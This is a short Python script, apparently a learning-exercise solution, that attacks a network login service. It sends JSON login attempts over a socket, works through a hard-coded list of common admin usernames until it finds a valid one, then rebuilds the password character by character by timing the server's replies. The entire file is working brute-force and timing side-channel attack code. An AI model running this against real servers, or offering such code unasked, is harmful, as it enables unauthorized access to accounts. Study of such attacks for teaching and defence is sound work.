import socket
import sys
import json
import string
from datetime import datetime


# A list of commonly used admin logins
logins_list = [
    'admin', 'Admin', 'admin1', 'admin2', 'admin3',
    'user1', 'user2', 'root', 'default', 'new_user',
    'some_user', 'new_admin', 'administrator',
    'Administrator', 'superuser', 'super', 'su', 'alex',
    'suser', 'rootuser', 'adminadmin', 'useruser',
    'superadmin', 'username', 'username1']

# Checking arguments provided at command-line
hostname = sys.argv[1]
port = int(sys.argv[2])

login = ''
password = ''

# Connecting to the server
with socket.socket() as my_sock:
    my_sock.connect((hostname, port))

    # Hacking login
    for item in logins_list:
        login_message = json.dumps({'login': item, 'password': ' '})
        my_sock.send(login_message.encode())
        login_response = json.loads(my_sock.recv(1024).decode())
        #print(login_response)

        if login_response['result'] == 'Wrong password!':
            login = ''.join(item)
            break
    #print(login)

    # Hacking password
    characters = string.ascii_letters + string.digits
    #print(characters)
    key = iter(characters)
    response = {}
    
    while True:
        try:
            letter = next(key)
            login_password_message = {'login': login, 'password': password + letter}
            json_message = json.dumps(login_password_message)
            my_sock.send(json_message.encode())
            start_time = datetime.now()
            response = json.loads(my_sock.recv(1024).decode())
            end_time = datetime.now()
            time_difference = end_time - start_time
            #print(response)
        except StopIteration:
            break
        if time_difference.total_seconds() >= 0.1 and response == {'result': 'Wrong password!'}:
            key = iter(characters)
            password += letter
            #print(password)
        if response == {'result': 'Connection success!'}:
            password += letter
            #print(password)
            break

print(json.dumps({'login': login, 'password': password}, indent=4))

